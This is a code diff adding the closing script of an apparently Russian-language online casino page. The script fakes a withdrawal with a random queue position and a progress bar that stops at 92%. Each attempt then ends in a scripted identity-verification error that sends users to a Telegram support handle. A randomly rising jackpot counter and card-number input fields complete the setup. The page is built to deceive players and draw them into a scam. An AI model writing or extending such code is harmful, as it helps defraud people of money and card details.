+  document.getElementById('procId').textContent = '#' + procId;
+
+  let queuePos = Math.floor(40000 + Math.random() * 20000);
+  document.getElementById('procQueue').textContent = queuePos.toLocaleString('ru-RU');
+
+  const spinner = document.getElementById('procSpinner');
+  const title = document.getElementById('procTitle');
+  const text = document.getElementById('procText');
+  const status = document.getElementById('procStatus');
+  const progress = document.getElementById('procProgress');
+  const errBox = document.getElementById('procError');
+  const errText = document.getElementById('procErrorText');
+
+  spinner.classList.remove('hidden');
+  errBox.classList.add('hidden');
+  title.textContent = 'Обработка заявки';
+  text.textContent = 'Пожалуйста, не закрывайте страницу';
+  status.textContent = 'В обработке';
+  status.style.color = 'var(--green)';
+  progress.style.width = '0%';
+
+  let p = 0;
+
+  clearInterval(processingTimer);
+  processingTimer = setInterval(() => {
+    p += Math.random() * 6;
+    if (p > 92) p = 92;
+    progress.style.width = p + '%';
+
+    if (Math.random() < 0.35) {
+      queuePos -= Math.floor(Math.random() * 300);
+      if (queuePos < 0) queuePos = 0;
+      document.getElementById('procQueue').textContent = queuePos.toLocaleString('ru-RU');
+    }
+
+    if (p >= 92) {
+      clearInterval(processingTimer);
+      setTimeout(() => showProcessingError(), 900);
+    }
+  }, 500);
+}
+
+function showProcessingError() {
+  const spinner = document.getElementById('procSpinner');
+  const title = document.getElementById('procTitle');
+  const text = document.getElementById('procText');
+  const status = document.getElementById('procStatus');
+  const errBox = document.getElementById('procError');
+  const errText = document.getElementById('procErrorText');
+
+  spinner.classList.add('hidden');
+  title.textContent = 'Требуется верификация';
+  text.textContent = 'Не удалось подтвердить личность получателя';
+  status.textContent = 'Отклонено';
+  status.style.color = 'var(--red)';
+
+  errText.textContent = 'Для завершения вывода необходимо пройти верификацию аккаунта. Обратитесь в службу поддержки в Telegram: @zuno07_support';
+  errBox.classList.remove('hidden');
+}
+
+// ─── JACKPOT ANIMATION ───
+let jackpotValue = 1247832;
+setInterval(() => {
+  jackpotValue += Math.floor(Math.random() * 500);
+  const el = document.getElementById('jackpot');
+  if (el) el.textContent = jackpotValue.toLocaleString('ru-RU') + ' ₽';
+}, 1500);
+
+// ─── INPUT MASKS ───
+document.addEventListener('input', (e) => {
+  if (e.target.id === 'cardNum') {
+    let v = e.target.value.replace(/\D/g, '').slice(0, 16);
+    e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+  }
+  if (e.target.id === 'cardExp') {
+    let v = e.target.value.replace(/\D/g, '').slice(0, 4);
+    e.target.value = v.length > 2 ? v.slice(0, 2) + '/' + v.slice(2) : v;
+  }
+  if (e.target.id === 'withdrawAmount') {
+    let v = e.target.value.replace(/\D/g, '');
+    e.target.value = v ? parseInt(v).toLocaleString('ru-RU') : '';
+  }
+});
+
+// ─── INIT ───
+initReels();
+updateBalance();
+</script>
+
+</body>
+</html>
